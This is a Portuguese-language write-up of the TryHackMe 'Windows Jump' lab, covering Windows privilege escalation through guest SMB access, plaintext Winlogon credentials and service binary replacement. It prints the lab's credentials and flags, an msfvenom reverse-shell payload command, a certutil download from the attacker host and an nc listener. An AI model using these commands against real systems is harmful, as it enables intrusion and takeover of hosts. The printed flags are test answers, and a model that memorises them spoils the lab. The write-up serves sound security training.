# Guia Completo — TryHackMe: Windows Jump

## Visão Geral

Cadeia de escalação: guest → thmuser → notadmin → svcadmin → SYSTEM

## Ferramentas Utilizadas

nmap — Descoberta de portas e serviços
enum4linux — Enumeração SMB
smbclient — Acesso a partilhas SMB
xfreerdp — Cliente RDP
cmdkey — Credenciais guardadas
reg query — Consulta ao registo
runas — Executar como outro utilizador
sc / icacls — Serviços e permissões
msfvenom — Gerar payloads
impacket-smbserver — Servidor SMB temporário
nc — Listener para shell reversa
PowerShell — Testes de conectividade

## Passo 1 — Reconhecimento com Nmap

nmap -sC -sV -p- ip do alvo 

Portas abertas: 
135/tcp msrpc,
139/tcp netbios-ssn, 
445/tcp microsoft-ds, 
3389/tcp ms-wbt-server, 
5985/tcp wsman, 
7680/tcp pando-pub,
 47001/tcp winrm

Domínio: PRIVESC
SO: Windows 10 / Server 2019 (build 17763)

## Passo 2 — Enumeração SMB com enum4linux

enum4linux -a ip do alvo

Descoberta: "[+] Server allows authentication via username 'cqugxzfh' and password ''"

Guest access ativo.

## Passo 3 — Acesso SMB com smbclient

Listar partilhas: smbclient -L //1ip do alvo -U 'guest%'

Partilhas: ADMIN$, C$, IPC$, Public

Aceder a Public: smbclient //ip do alvo/Public -U 'guest%'
 - Dentro: ls, 
         : get welcome.txt, exit

Ler: cat welcome.txt

* Conteúdo: 
    Username: thmuser,
		Password: Password1!

## Passo 4 — Acesso RDP como thmuser

xfreerdp /v:ip do alvo /u:thmuser /p:'Password1!' /cert:ignore /dynamic-resolution

## Passo 5 — Flag 1

dir C:\ /s /b | find "flag1.txt"
type C:\Users\thmuser\Desktop\flag1.txt

Flag 1: THM{5mb_cr3d5_1n_th3_5h4r3}

## Passo 6 — Procurar Flag 2

dir C:\ /s /b | find "flag2.txt"

Resultado: C:\Users\notadmin\Desktop\flag2.txt

## Passo 7 — Credenciais guardadas

cmdkey /list

Resultado como thmuser: * NONE *

## Passo 8 — Registo Winlogon

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

Resultado: DefaultUserName REG_SZ notadmin, DefaultPassword REG_SZ P@ssw0rd!

## Passo 9 — Executar como notadmin

runas /user:PRIVESC\notadmin cmd.exe

Password: P@ssw0rd!

## Passo 10 — Flag 2

type C:\Users\notadmin\Desktop\flag2.txt

Flag 2: THM{w1nl0g0n_cr3ds_3xp0s3d}

## Passo 11 — Análise do serviço THMSvc

sc qc THMSvc

Resultado: SERVICE_NAME: THMSvc, TYPE: 10 WIN32_OWN_PROCESS, START_TYPE: 3 DEMAND_START, BINARY_PATH_NAME: C:\Windows\THMSVC\svc.exe, SERVICE_START_NAME: .\svcadmin

Permissões: icacls C:\Windows\THMSvc

Resultado: C:\Windows\THMSvc PRIVESC\notadmin:(OI)(CI)(F), BUILTIN\Administrators:(OI)(CI)(F), NT AUTHORITY\SYSTEM:(OI)(CI)(F)

notadmin tem Full Control sobre o diretório do serviço.

## Passo 12 — Gerar payload com msfvenom

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.131.136 LPORT=4444 -f exe -o svc.exe

Nota: usar -f exe em vez de exe-service (mais fiável).

## Passo 13 — Transferir o payload

Método 1 — HTTP: python3 -m http.server 8080 --bind 0.0.0.0
Na alvo: certutil -urlcache -split -f http://ip do atacante:8080/svc.exe C:\Users\Public\svc.exe

Método 2 — RDP Drive Sharing (funcionou):
xfreerdp /v:ip do atacant /u:notadmin /p:'P@ssw0rd!' /cert:ignore /dynamic-resolution /drive:share,/Users/Nomdepositodoatacnte/Desktop/lab
Na alvo: copy \\tsclient\share\svc.exe C:\Windows\THMSvc\svc.exe

Método 3 — SMB Server: impacket-smbserver share . -smb2support

## Passo 14 — Substituir o binário do serviço

copy C:\Windows\THMSvc\svc.exe C:\Windows\THMSvc\svc.exe.bak
copy C:\Users\Public\svc.exe C:\Windows\THMSvc\svc.exe

## Passo 15 — Preparar o listener

nc -lvnp 4444

Alternativa: msfconsole -q -x "use multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST 192.168.131.136; set LPORT 4444; run"

## Passo 16 — Reiniciar o serviço

sc stop THMSvc
sc start THMSvc

Resultado: STATE: 4 RUNNING, PID: 5252

Shell reversa recebida.

## Passo 17 — Flag 3 (svcadmin)

whoami
cd C:\Users\svcadmin\Desktop
type flag3.txt

Flag 3: THM{svc4dm1n_4cc3ss}

## Passo 18 — Escalação para SYSTEM
Nota :  falta para fazer ...... 
whoami /priv

Procurar SeImpersonatePrivilege.
Ferramentas: PrintSpoofer, RoguePotato, GodPotato.

Exemplo: PrintSpoofer.exe -i -c cmd

## Resumo da Cadeia

Etapa 1: guest — SMB welcome.txt — sem flag
Etapa 2: thmuser — RDP — THM{5mb_cr3d5_1n_th3_5h4r3}
Etapa 3: notadmin — Winlogon runas — THM{w1nl0g0n_cr3ds_3xp0s3d}
Etapa 4: svcadmin — Substituição do THMSvc — THM{svc4dm1n_4cc3ss}
Etapa 5: SYSTEM — SeImpersonatePrivilege — final

## Lições Aprendidas

1. Guest access em SMB — verificar com enum4linux.
2. Registo Winlogon pode ter passwords em texto limpo.
3. Permissões de diretórios de serviços são críticas.
4. Formato do payload importa — exe vs exe-service.
5. RDP drive sharing é alternativa quando HTTP/SMB falham.
6. Confirmar IP da VPN antes de gerar payloads.

Guia gerado com base na resolução da sala Windows Jump — TryHackMe.